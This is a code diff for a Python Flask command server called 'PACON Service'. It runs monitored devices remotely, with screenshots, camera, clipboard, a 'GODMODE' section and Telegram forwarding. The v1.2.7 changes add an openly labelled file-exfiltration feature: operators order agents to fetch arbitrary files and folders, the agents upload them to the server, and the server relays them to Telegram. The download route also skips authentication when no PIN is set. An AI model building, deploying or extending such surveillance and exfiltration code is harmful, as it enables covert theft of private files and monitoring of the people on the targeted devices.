@@ -1,22 +1,26 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PACON Service - v1.2.6
+PACON Service - v1.2.7
 =======================
+v1.2.7 changes:
+  - NEW: RECEIVED_DIR + file exfiltration index
+  - NEW: /api/monitor/file-upload (agent uploads files)
+  - NEW: /api/files/received[/dev/file] (list + download + delete)
+  - NEW: /api/control/fetch-file + /api/control/fetch-folder
+  - PATCHED: /api/telegram/send-file now supports source=received
+  - PATCHED: /api/files/list merges admin + received
+  - MAX_CONTENT_LENGTH raised to 64MB
 v1.2.6 changes:
-  - NEW: /api/agent/ping — stateless agent auth check (never registers device)
+  - NEW: /api/agent/ping — stateless agent auth check
   - NEW: /api/debug/clear-preflight — one-shot ghost device cleanup
   - HARDENED: _resolve_canonical_id rejects __placeholder__ IDs
   - HARDENED: /api/control/poll refuses placeholder device IDs
   - HARDENED: orphan cleanup auto-purges placeholders
 v1.2.5 changes:
   - Console logging for every /api/devices and /api/apps/list call
-  - /api/apps/list accepts devices offline up to 5 min (was 15s)
-  - /api/apps (unscoped) same 5-min grace period
-  - /api/monitor/apps logs when apps are stored
-  - /api/control/poll logs every 10th poll per device
-  - NEW: /api/debug/apps-status endpoint for pinpointing issues
-  - Better watchdog/cleanup logging
+  - /api/apps/list accepts devices offline up to 5 min
+  - NEW: /api/debug/apps-status endpoint
 """
 
 import os
@@ -56,12 +60,13 @@ SCREENSHOT_DIR = BASE_DIR / 'screenshots'
 LOGS_DIR       = BASE_DIR / 'logs'
 DATA_DIR       = BASE_DIR / 'data'
 CAMERA_DIR     = BASE_DIR / 'camera'
-FILES_DIR      = BASE_DIR / 'files'
+FILES_DIR      = BASE_DIR / 'files'          # admin-uploaded
+RECEIVED_DIR   = BASE_DIR / 'received'       # ✅ v1.2.7
 UPLOAD_DIR     = BASE_DIR / 'uploads'
 DEVICE_DIR     = BASE_DIR / 'devices'
 
 for d in [BASE_DIR, SCREENSHOT_DIR, LOGS_DIR, DATA_DIR,
-          CAMERA_DIR, FILES_DIR, UPLOAD_DIR, DEVICE_DIR]:
+          CAMERA_DIR, FILES_DIR, RECEIVED_DIR, UPLOAD_DIR, DEVICE_DIR]:
     d.mkdir(parents=True, exist_ok=True)
 
 # ============================================================
@@ -113,6 +118,7 @@ LOGIN_WINDOW       = 300
 # ============================================================
 app = Flask(__name__)
 app.config['JSON_SORT_KEYS'] = False
+app.config['MAX_CONTENT_LENGTH'] = 64 * 1024 * 1024  # ✅ v1.2.7: 64MB
 ALLOWED_ORIGINS = [
     'https://service-ur14.onrender.com',
     'http://localhost:5001',
@@ -140,25 +146,28 @@ control_devices     = {}
 device_online_state = {}
 device_agent_pid    = {}
 
-# Fingerprint map: (hostname|public_ip) -> canonical device_id
 device_fingerprint  = {}
 fingerprint_lock    = threading.Lock()
 
-# Poll counts for throttled logging
 poll_counts         = defaultdict(int)
+
+# ✅ v1.2.7: received-files index
+received_files       = []
+received_files_lock  = threading.Lock()
+MAX_RECEIVED_FILE_MB    = 50
+MAX_RECEIVED_TOTAL_MB   = 500
 
 ping_thread  = None
 ping_running = False
 ping_interval = 240
 
-# Thresholds
-OFFLINE_THRESHOLD = 15       # seconds without poll = offline
-OFFLINE_GRACE     = 30       # seconds before cache purge
-STALE_CUTOFF      = 300      # seconds before hidden from /api/devices
-ORPHAN_CUTOFF     = 600      # seconds before full deletion
-RESULT_TTL        = 300      # command result expiry
-PENDING_TTL       = 90       # registered-but-never-polled grace
-APPS_GRACE        = 300      # v1.2.5: apps served for devices offline < 5 min
+OFFLINE_THRESHOLD = 15
+OFFLINE_GRACE     = 30
+STALE_CUTOFF      = 300
+ORPHAN_CUTOFF     = 600
+RESULT_TTL        = 300
+PENDING_TTL       = 90
+APPS_GRACE        = 300
 
 _stop_event = threading.Event()
 
@@ -207,7 +216,7 @@ def _device_age(device_id: str, now: Optional[float] = None) -> Optional[float]:
     return now - last_poll
 
 # ============================================================
-# CANONICAL ID RESOLUTION
+# CANONICAL ID
 # ============================================================
 def _fingerprint_for(hostname: str, public_ip: str) -> Optional[str]:
     if not hostname and not public_ip:
@@ -215,33 +224,19 @@ def _fingerprint_for(hostname: str, public_ip: str) -> Optional[str]:
     return f"{(hostname or '').strip().lower()}|{(public_ip or '').strip()}"
 
 def _is_placeholder_id(did: str) -> bool:
-    """
-    v1.2.6: Return True if the ID is a placeholder (starts/ends with __).
-    Placeholders must NEVER be used as canonical IDs.
-    """
     return bool(did) and (did.startswith("__") or did.endswith("__"))
 
 def _resolve_canonical_id(incoming_id: str,
                           hostname: str = "",
                           public_ip: str = "") -> str:
-    """
-    v1.2.6: canonical ID resolution.
-    - Refuses to use placeholder IDs (__preflight__, __selftest__, etc.)
-    - Refuses to alias a real device to a placeholder fingerprint
-    """
-    # ✅ v1.2.6: reject placeholders outright
     if _is_placeholder_id(incoming_id):
         logger.warning(f"🚫 Refused placeholder device ID: {incoming_id}")
-        return incoming_id  # don't fingerprint, don't alias
-
+        return incoming_id
     fp = _fingerprint_for(hostname, public_ip)
     if not fp:
         return incoming_id
-
     with fingerprint_lock:
         existing = device_fingerprint.get(fp)
-
-        # ✅ v1.2.6: if the fingerprint points to a placeholder, replace it
         if existing and _is_placeholder_id(existing):
             logger.info(
                 f"🧹 Replacing placeholder fingerprint "
@@ -249,7 +244,6 @@ def _resolve_canonical_id(incoming_id: str,
             )
             device_fingerprint[fp] = incoming_id
             return incoming_id
-
         if existing and existing != incoming_id:
             now = time.time()
             last_poll = control_devices.get(existing, 0)
@@ -360,6 +354,7 @@ RATE_LIMITS = {
     'screenshot': (300, 60),
     'login':      (10, 300),
     'telegram':   (30, 60),
+    'upload':     (60, 60),   # ✅ v1.2.7
 }
 
 def rate_limit(category='default'):
@@ -399,7 +394,7 @@ def ping_server():
     while ping_running and not _stop_event.is_set():
         try:
             req = urllib.request.Request(url, method='GET')
-            req.add_header('User-Agent', 'PACON-SelfPing/1.2.6')
+            req.add_header('User-Agent', 'PACON-SelfPing/1.2.7')
             with urllib.request.urlopen(req, timeout=30) as response:
                 if response.status == 200:
                     logger.debug("✅ Self-ping OK")
@@ -499,6 +494,9 @@ def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "
     file_size = filepath.stat().st_size
     if file_size == 0:
         return {"success": False, "error": "File is empty"}
+    if file_size > 50 * 1024 * 1024:
+        return {"success": False,
+                "error": f"file too large for Telegram ({file_size//1024//1024}MB > 50MB)"}
     if field == "photo" and file_size > 10 * 1024 * 1024:
         return _telegram_upload("sendDocument", "document", filepath, caption)
     try:
@@ -625,15 +623,14 @@ def _cleanup_pending_registrations():
             device_online_state.pop(did, None)
             removed.append(did)
     if removed:
-        logger.info(f"🧹 Removed {len(removed)} pending (never-polled) "
-                    f"device(s): {[d[:8] for d in removed]}")
+        logger.info(f"🧹 Removed {len(removed)} pending device(s): {[d[:8] for d in removed]}")
 
 def _cleanup_orphans():
+    global received_files
     now = time.time()
     removed = []
     all_ids = set(devices.keys()) | set(control_devices.keys())
 
-    # ✅ v1.2.6: aggressively purge any placeholder devices
     for did in list(devices.keys()):
         if _is_placeholder_id(did):
             devices.pop(did, None)
@@ -673,8 +670,20 @@ def _cleanup_orphans():
                     if cid == did:
                         device_fingerprint.pop(fp, None)
     if removed:
-        logger.info(f"🧹 Orphan cleanup: removed {len(removed)} stale device(s): "
+        logger.info(f"🧹 Orphan cleanup: removed {len(removed)} device(s): "
                     f"{[d[:8] for d in removed]}")
+
+    # ✅ v1.2.7: cap received-files total size
+    with received_files_lock:
+        total = sum(f['size'] for f in received_files)
+        while total > MAX_RECEIVED_TOTAL_MB * 1024 * 1024 and received_files:
+            oldest = received_files.pop(0)
+            try:
+                if 'disk_path' in oldest:
+                    os.remove(oldest['disk_path'])
+            except Exception:
+                pass
+            total -= oldest.get('size', 0)
 
 def _cleanup_command_results():
     now = time.time()
@@ -682,8 +691,6 @@ def _cleanup_command_results():
              if now - r.get('timestamp', 0) > RESULT_TTL]
     for cid in stale:
         command_results.pop(cid, None)
-    if stale:
-        logger.debug(f"🧹 Cleaned {len(stale)} expired command results")
 
 def _device_watchdog():
     last_cleanup = time.time()
@@ -819,10 +826,10 @@ def serve_static(path):
 
 def get_fallback_html():
     return '''<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-    <h1>🛡️ PACON v1.2.6</h1><p>index.html not found in web/public/</p></body></html>'''
+    <h1>🛡️ PACON v1.2.7</h1><p>index.html not found in web/public/</p></body></html>'''
 
 # ============================================================
-# HEALTH & DIAGNOSTICS
+# HEALTH
 # ============================================================
 @app.route('/api/health', methods=['GET'])
 def health_check():
@@ -833,7 +840,7 @@ def health_check():
         "success":          True,
         "service":          "PACON API",
         "status":           "running",
-        "version":          "1.2.6",
+        "version":          "1.2.7",
         "platform":         platform.system(),
         "devices":          len(devices),
         "online_agents":    online_agents,
@@ -845,20 +852,16 @@ def health_check():
         "watchdog_alive":   bool(_watchdog_thread and _watchdog_thread.is_alive()),
         "results_cached":   len(command_results),
         "queued_commands":  sum(len(q) for q in command_queues.values()),
+        "received_files":   len(received_files),
         "timestamp":        datetime.now().isoformat(),
     })
 
 # ============================================================
-# v1.2.6: STATELESS AGENT AUTH CHECK
+# STATELESS AGENT AUTH
 # ============================================================
 @app.route('/api/agent/ping', methods=['GET'])
 @require_agent_auth
 def agent_ping():
-    """
-    v1.2.6: Lightweight auth check for agents.
-    NEVER registers a device. NEVER stores a fingerprint.
-    Used by the agent's network pre-flight instead of /api/control/poll.
-    """
     return jsonify({
         'success':     True,
         'pong':        True,
@@ -867,14 +870,9 @@ def agent_ping():
         'agent_pin_ok': True,
     })
 
-
 @app.route('/api/debug/clear-preflight', methods=['POST'])
 @require_parent_auth
 def clear_preflight():
-    """
-    v1.2.6: One-shot cleanup of any ghost devices with '__' prefix.
-    This includes '__preflight__', '__selftest__', '__diag__', etc.
-    """
     removed = []
     for did in list(devices.keys()):
         if did == "__preflight__" or did.startswith("__"):
@@ -944,11 +942,6 @@ def debug_devices():
 @app.route('/api/debug/apps-status', methods=['GET'])
 @require_parent_auth
 def debug_apps_status():
-    """
-    v1.2.5: Diagnose why apps aren't showing for a device.
-    Shows which devices the server has polled, which have apps cached,
-    and whether the server would serve apps for them.
-    """
     now = time.time()
     out = {}
     for did, info in devices.items():
@@ -956,10 +949,8 @@ def debug_apps_status():
         has_apps = did in installed_apps
         app_count = len(installed_apps.get(did, []))
         would_serve = (
-            did in control_devices
-            and age is not None
-            and age < APPS_GRACE
-            and has_apps
+            did in control_devices and age is not None
+            and age < APPS_GRACE and has_apps
         )
         out[did] = {
             'name':              info.get('name'),
@@ -1018,6 +1009,7 @@ def get_status():
             "installed_apps":  sum(len(v) for v in installed_apps.values()),
             "devices":         len(devices),
             "control_devices": len(control_devices),
+            "received_files":  len(received_files),
         },
         "devices":   devices,
         "timestamp": datetime.now().isoformat(),
@@ -1026,14 +1018,9 @@ def get_status():
 @app.route('/api/devices', methods=['GET'])
 @require_parent_auth
 def get_devices():
-    """
-    v1.2.5: Returns all recently-active devices.
-    Logs to console on every call.
-    """
     now = time.time()
     enriched = {}
     for did, info in devices.items():
-        # Must have polled at least once — otherwise pending
         if did not in control_devices:
             ls = info.get('last_seen', '')
             if ls:
@@ -1063,7 +1050,6 @@ def get_devices():
         d['app_count'] = len(installed_apps.get(did, []))
         enriched[did] = d
 
-    # ✅ v1.2.5: Console logging for every request
     online_count = sum(1 for d in enriched.values() if d.get('online'))
     pending_count = sum(1 for d in enriched.values() if d.get('pending'))
     print(f"📋 [/api/devices] returning {len(enriched)} device(s) — "
@@ -1174,22 +1160,199 @@ def get_camera_photo(filename):
     return jsonify({"error": "File not found"}), 404
 
 # ============================================================
-# FILES / ACTIVITY
+# FILES / ACTIVITY (patched v1.2.7)
 # ============================================================
 @app.route('/api/files/list', methods=['GET'])
 @require_parent_auth
 def list_files():
-    limit = request.args.get('limit', 50, type=int)
-    files = []
-    for file in sorted(FILES_DIR.glob('*'),
-                       key=lambda x: x.stat().st_mtime, reverse=True)[:limit]:
-        files.append({
-            'name':           file.name,
-            'size':           file.stat().st_size,
-            'size_formatted': f"{file.stat().st_size / 1024:.1f} KB",
-            'modified':       datetime.fromtimestamp(file.stat().st_mtime).isoformat(),
+    limit = request.args.get('limit', 100, type=int)
+    merged = []
+
+    for file in FILES_DIR.glob('*'):
+        try:
+            st = file.stat()
+            merged.append({
+                'name':      file.name,
+                'size':      st.st_size,
+                'size_formatted': f"{st.st_size / 1024:.1f} KB",
+                'modified':  datetime.fromtimestamp(st.st_mtime).isoformat(),
+                'source':    'admin',
+                'url':       None,
+            })
+        except Exception:
+            pass
+
+    with received_files_lock:
+        for f in received_files:
+            merged.append({
+                'name':      f['filename'],
+                'size':      f['size'],
+                'size_formatted': f"{f['size'] / 1024:.1f} KB",
+                'modified':  f['timestamp'],
+                'source':    'received',
+                'device_id': f.get('device_id'),
+                'dev_folder': f.get('dev_folder'),
+                'url':       f.get('url'),
+            })
+
+    merged.sort(key=lambda x: x['modified'], reverse=True)
+    return jsonify(merged[:limit])
+
+# ============================================================
+# ✅ v1.2.7: FILE EXFILTRATION
+# ============================================================
+def _save_received_file(device_id: str, filename: str, raw: bytes,
+                        source_path: str, mime: str) -> dict:
+    global received_files
+    safe_dev  = safe_filename(device_id or "unknown")[:32]
+    safe_name = safe_filename(filename or "file.bin")
+    dev_dir   = RECEIVED_DIR / safe_dev
+    dev_dir.mkdir(parents=True, exist_ok=True)
+    dest      = dev_dir / safe_name
+    if dest.exists():
+        stem, ext = os.path.splitext(safe_name)
+        dest = dev_dir / f"{stem}_{int(time.time())}{ext}"
+    with open(dest, 'wb') as f:
+        f.write(raw)
+    size = dest.stat().st_size
+    entry = {
+        'filename':    dest.name,
+        'device_id':   device_id,
+        'source_path': source_path,
+        'mime':        mime,
+        'size':        size,
+        'timestamp':   datetime.now().isoformat(),
+        'url':         f'/api/files/received/{safe_dev}/{dest.name}',
+        'disk_path':   str(dest),
+        'dev_folder':  safe_dev,
+    }
+    with received_files_lock:
+        received_files.append(entry)
+        if len(received_files) > 2000:
+            received_files[:] = received_files[-2000:]
+    return entry
+
+@app.route('/api/monitor/file-upload', methods=['POST'])
+@require_agent_auth
+@rate_limit('upload')
+def monitor_file_upload():
+    try:
+        incoming_id = (
+            request.form.get('deviceId')
+            or (request.json or {}).get('deviceId')
+            or request.args.get('deviceId', 'unknown')
+        )
+        hostname  = (
+            request.form.get('deviceModel')
+            or (request.json or {}).get('deviceModel')
+            or ''
+        )
+        public_ip = _get_public_ip_from_request()
+        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+
+        if 'file' in request.files:
+            fobj     = request.files['file']
+            raw      = fobj.read()
+            filename = fobj.filename or 'file.bin'
+            source_path = request.form.get('source_path', filename)
+            mime        = fobj.mimetype or 'application/octet-stream'
+        else:
+            data = request.json or {}
+            b64  = data.get('data_b64') or data.get('data') or ''
+            if not b64:
+                return jsonify({'success': False, 'error': 'no file data'}), 400
+            filename    = data.get('filename', 'file.bin')
+            source_path = data.get('source_path', filename)
+            mime        = data.get('mime', 'application/octet-stream')
+            try:
+                raw = base64.b64decode(b64)
+            except Exception as e:
+                return jsonify({'success': False, 'error': f'bad base64: {e}'}), 400
+
+        size = len(raw)
+        if size == 0:
+            return jsonify({'success': False, 'error': 'empty file'}), 400
+        if size > MAX_RECEIVED_FILE_MB * 1024 * 1024:
+            return jsonify({
+                'success': False,
+                'error': f'file too large ({size//1024//1024}MB > {MAX_RECEIVED_FILE_MB}MB)',
+            }), 413
+
+        entry = _save_received_file(device_id, filename, raw, source_path, mime)
+
+        if device_id in devices:
+            devices[device_id]['last_seen'] = datetime.now().isoformat()
+
+        add_activity('file_received',
+                     f'{entry["filename"]} ({size//1024}KB) from {device_id[:8]}',
+                     device_id)
+        logger.info(f"📥 Received file {entry['filename']} "
+                    f"({size//1024}KB) from {device_id[:8]}")
+        return jsonify({
+            'success':  True,
+            'entry':    entry,
+            'device_id': device_id,
         })
-    return jsonify(files)
+    except Exception as e:
+        logger.error(f"file_upload error: {e}")
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/files/received', methods=['GET'])
+@require_parent_auth
+def list_received_files():
+    device_id = request.args.get('deviceId', '')
+    limit     = request.args.get('limit', 200, type=int)
+    with received_files_lock:
+        items = list(received_files)
+    if device_id:
+        items = [f for f in items if f.get('device_id') == device_id]
+    items.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
+    clean = [{k: v for k, v in f.items() if k != 'disk_path'} for f in items[:limit]]
+    total_bytes = sum(f['size'] for f in items)
+    return jsonify({
+        'success': True,
+        'files':   clean,
+        'count':   len(clean),
+        'total_bytes': total_bytes,
+        'total_mb': round(total_bytes / 1024 / 1024, 2),
+    })
+
+@app.route('/api/files/received/<dev_folder>/<filename>', methods=['GET'])
+def download_received_file(dev_folder, filename):
+    if PARENT_PIN:
+        token = _server_token_from_request()
+        if not _is_valid_session(token):
+            return jsonify({"error": "unauthorized"}), 401
+    dev_folder = safe_filename(dev_folder)
+    filename   = safe_filename(filename)
+    filepath   = RECEIVED_DIR / dev_folder / filename
+    if not filepath.exists():
+        return jsonify({"error": "File not found"}), 404
+    import mimetypes
+    mime = mimetypes.guess_type(str(filepath))[0] or 'application/octet-stream'
+    return send_file(filepath, mimetype=mime, as_attachment=True,
+                     download_name=filename)
+
+@app.route('/api/files/received/<dev_folder>/<filename>', methods=['DELETE'])
+@require_parent_auth
+def delete_received_file(dev_folder, filename):
+    global received_files
+    dev_folder = safe_filename(dev_folder)
+    filename   = safe_filename(filename)
+    filepath   = RECEIVED_DIR / dev_folder / filename
+    if not filepath.exists():
+        return jsonify({'success': False, 'error': 'not found'}), 404
+    try:
+        filepath.unlink()
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+    with received_files_lock:
+        received_files[:] = [
+            f for f in received_files
+            if not (f.get('dev_folder') == dev_folder and f.get('filename') == filename)
+        ]
+    logger.info(f"🗑️ Deleted received file {dev_folder}/{filename}")
+    return jsonify({'success': True})
 
 @app.route('/api/activity', methods=['GET'])
 @require_parent_auth
@@ -1202,32 +1365,26 @@ def get_activity():
     })
 
 # ============================================================
-# APP ENDPOINTS — v1.2.5 with diagnostic logging
+# APP ENDPOINTS
 # ============================================================
 @app.route('/api/apps', methods=['GET'])
 @require_parent_auth
 def get_apps():
-    """v1.2.5: Returns apps with 5-min grace period after last poll."""
     device_id = request.args.get('deviceId', '')
     limit     = request.args.get('limit', 50, type=int)
     now       = time.time()
 
     if device_id:
         age = now - control_devices.get(device_id, 0) if device_id in control_devices else None
-        has_apps = device_id in installed_apps
         cache_size = len(installed_apps.get(device_id, []))
-
         print(f"📋 [/api/apps] device={device_id[:8]} "
-              f"age={int(age) if age else 'N/A'}s "
-              f"cache={cache_size}",
+              f"age={int(age) if age else 'N/A'}s cache={cache_size}",
               flush=True)
-
         if age is None or age > APPS_GRACE:
             print(f"   → REFUSED (age > {APPS_GRACE}s)", flush=True)
             return jsonify([])
         return jsonify(installed_apps.get(device_id, [])[:limit])
 
-    # No device — aggregate from recently-active devices
     result = []
     for did, apps in installed_apps.items():
         age = now - control_devices.get(did, 0) if did in control_devices else None
@@ -1238,38 +1395,25 @@ def get_apps():
 @app.route('/api/apps/list', methods=['GET'])
 @require_parent_auth
 def apps_list():
-    """
-    v1.2.5: Return apps if device polled within APPS_GRACE seconds (5 min).
-    Logs to console on every call.
-    """
     device_id = request.args.get('deviceId', '')
     now = time.time()
-
     if not device_id:
         print(f"📋 [apps_list] no deviceId provided → []", flush=True)
         return jsonify([])
-
     has_polled = device_id in control_devices
     age = (now - control_devices.get(device_id, 0)) if has_polled else None
     has_cache = device_id in installed_apps
     cache_size = len(installed_apps.get(device_id, []))
-
-    # ✅ v1.2.5: Console log every request
-    print(f"📋 [apps_list] device={device_id[:8]} "
-          f"has_polled={has_polled} "
+    print(f"📋 [apps_list] device={device_id[:8]} has_polled={has_polled} "
           f"age={int(age) if age is not None else 'N/A'}s "
           f"has_cache={has_cache} cache_size={cache_size}",
           flush=True)
-
-    # Refuse only if never polled or offline for > APPS_GRACE seconds
     if not has_polled:
         print(f"   → REFUSED: device has never polled", flush=True)
         return jsonify([])
-
     if age is None or age > APPS_GRACE:
         print(f"   → REFUSED: offline for {int(age)}s (> {APPS_GRACE}s grace)", flush=True)
         return jsonify([])
-
     apps = installed_apps.get(device_id, [])
     print(f"   → RETURNING {len(apps)} apps", flush=True)
     return jsonify(apps)
@@ -1569,13 +1713,10 @@ def monitor_apps():
 
         if apps and isinstance(apps[0], dict) and 'label' in apps[0]:
             installed_apps[device_id] = apps
-            # ✅ v1.2.5: console log when apps are stored
             total_cached = sum(len(v) for v in installed_apps.values())
             print(f"📱 [monitor_apps] STORED {len(apps)} apps for "
-                  f"device={device_id[:8]} "
-                  f"(total: {total_cached} apps across "
-                  f"{len(installed_apps)} device(s))",
-                  flush=True)
+                  f"device={device_id[:8]} (total: {total_cached} apps across "
+                  f"{len(installed_apps)} device(s))", flush=True)
             logger.info(f"📱 Installed apps: {len(apps)} from {device_id[:8]}")
         else:
             app_usage.append({
@@ -1690,7 +1831,6 @@ def control_poll():
 
     incoming_id = request.args.get('deviceId', 'unknown')
 
-    # ✅ v1.2.6: refuse placeholder device IDs
     if _is_placeholder_id(incoming_id):
         logger.warning(f"🚫 Refused poll from placeholder ID: {incoming_id}")
         return jsonify({"success": False, "error": "placeholder id not allowed"}), 400
@@ -1700,11 +1840,9 @@ def control_poll():
 
     control_devices[device_id] = time.time()
 
-    # ✅ v1.2.5: log every 10th poll per device
     poll_counts[device_id] += 1
     if poll_counts[device_id] % 10 == 1:
-        print(f"📡 [poll] device={device_id[:8]} "
-              f"poll #{poll_counts[device_id]}",
+        print(f"📡 [poll] device={device_id[:8]} poll #{poll_counts[device_id]}",
               flush=True)
 
     if device_id in devices:
@@ -1931,7 +2069,47 @@ def control_devices_list():
     return jsonify({'success': True, 'devices': online})
 
 # ============================================================
-# GODMODE CONTROL ENDPOINTS
+# ✅ v1.2.7: FETCH FILE / FOLDER
+# ============================================================
+@app.route('/api/control/fetch-file', methods=['POST'])
+@require_parent_auth
+@rate_limit('control')
+def control_fetch_file():
+    d = request.json or {}
+    path = (d.get('path') or '').strip()
+    if not path:
+        return jsonify({'success': False, 'error': 'path required'}), 400
+    payload, code = _enqueue_response(
+        d.get('deviceId', 'unknown'), 'fetch_file',
+        {'path': path}, ttl=30.0)
+    if code == 200:
+        add_activity('fetch_file',
+                     f'Fetch: {path[:120]}',
+                     d.get('deviceId', 'unknown'))
+    return jsonify(payload), code
+
+@app.route('/api/control/fetch-folder', methods=['POST'])
+@require_parent_auth
+@rate_limit('control')
+def control_fetch_folder():
+    d = request.json or {}
+    path   = (d.get('path') or '').strip()
+    glob   = (d.get('glob') or '*').strip() or '*'
+    max_n  = int(d.get('max', 20))
+    max_n  = max(1, min(max_n, 50))
+    if not path:
+        return jsonify({'success': False, 'error': 'path required'}), 400
+    payload, code = _enqueue_response(
+        d.get('deviceId', 'unknown'), 'fetch_folder',
+        {'path': path, 'glob': glob, 'max': max_n}, ttl=45.0)
+    if code == 200:
+        add_activity('fetch_folder',
+                     f'Fetch folder: {path}\\{glob} (max {max_n})',
+                     d.get('deviceId', 'unknown'))
+    return jsonify(payload), code
+
+# ============================================================
+# GODMODE
 # ============================================================
 @app.route('/api/control/clipboard-get', methods=['POST'])
 @require_parent_auth
@@ -2067,13 +2245,33 @@ def telegram_send_camera(filename):
 @require_parent_auth
 @rate_limit('telegram')
 def telegram_send_file(filename):
+    """
+    v1.2.7: source=received | uploads | files (default)
+    """
     filename = safe_filename(filename)
-    for directory in [UPLOAD_DIR, FILES_DIR]:
-        filepath = directory / filename
+    source   = (request.args.get('source') or 'files').lower()
+    dev_fold = safe_filename(request.args.get('dev_folder', '') or '')
+    candidates = []
+    if source == 'received':
+        if not dev_fold:
+            return jsonify({'success': False, 'error': 'dev_folder required'}), 400
+        candidates.append(RECEIVED_DIR / dev_fold / filename)
+    elif source == 'uploads':
+        candidates.append(UPLOAD_DIR / filename)
+    else:
+        candidates.append(FILES_DIR / filename)
+        candidates.append(UPLOAD_DIR / filename)
+
+    for filepath in candidates:
         if filepath.exists():
-            caption = f"📎 <b>File</b>: {filename}\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+            device_id = request.args.get('deviceId', '')
+            size_kb = filepath.stat().st_size // 1024
+            caption = f"📎 <b>File</b>: <code>{filename}</code>\n📦 {size_kb} KB"
+            if device_id:
+                caption += f"\n📱 Device: <code>{device_id[:12]}</code>"
+            caption += f"\n🕐 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
             r = _telegram_send_document(filepath, caption)
-            add_activity('telegram', f'Sent file {filename}')
+            add_activity('telegram', f'Sent file {filename}', device_id)
             return jsonify(r)
     return jsonify({'success': False, 'error': f'File not found: {filename}'}), 404
 
@@ -2122,6 +2320,10 @@ def telegram_send_text():
 def not_found(e):
     return jsonify({"success": False, "error": "Endpoint not found"}), 404
 
+@app.errorhandler(413)
+def request_too_large(e):
+    return jsonify({"success": False, "error": "File too large for upload (max 64MB)"}), 413
+
 @app.errorhandler(Exception)
 def handle_exception(e):
     logger.exception(f"Unhandled: {e}")
@@ -2145,23 +2347,17 @@ except Exception:
 # ============================================================
 def main():
     print("=" * 70)
-    print("  PACON SERVICE v1.2.6 — STATELESS AGENT AUTH")
+    print("  PACON SERVICE v1.2.7 — FILE EXFILTRATION + LIVE TYPING")
     print("=" * 70)
     print(f"  Web dir:          {WEB_DIR}")
+    print(f"  Received dir:     {RECEIVED_DIR}")
     print(f"  Running on Render:{IS_RENDER}")
     print(f"  Parent PIN:       {'SET' if PARENT_PIN else 'NOT SET'}")
     print(f"  Agent PIN:        {'SET' if AGENT_PIN else 'NOT SET'}")
     print(f"  Telegram:         {'ENABLED' if telegram_config.get('enabled') else 'disabled'}")
     print(f"  Offline threshold:{OFFLINE_THRESHOLD}s")
     print(f"  Apps grace:       {APPS_GRACE}s")
-    print(f"  Stale cutoff:     {STALE_CUTOFF}s")
-    print(f"  Orphan cutoff:    {ORPHAN_CUTOFF}s")
-    print("=" * 70)
-    print("  Console log prefixes you'll see:")
-    print("    📋 [/api/devices]     — devices returned to UI")
-    print("    📋 [apps_list]        — app-list requests + response size")
-    print("    📱 [monitor_apps]     — apps stored by the agent")
-    print("    📡 [poll]             — agent polls (every 10th)")
+    print(f"  Max upload:       {MAX_RECEIVED_FILE_MB}MB per file / 64MB per request")
     print("=" * 70)
 
     logger.info(f"Web dir: {WEB_DIR}")
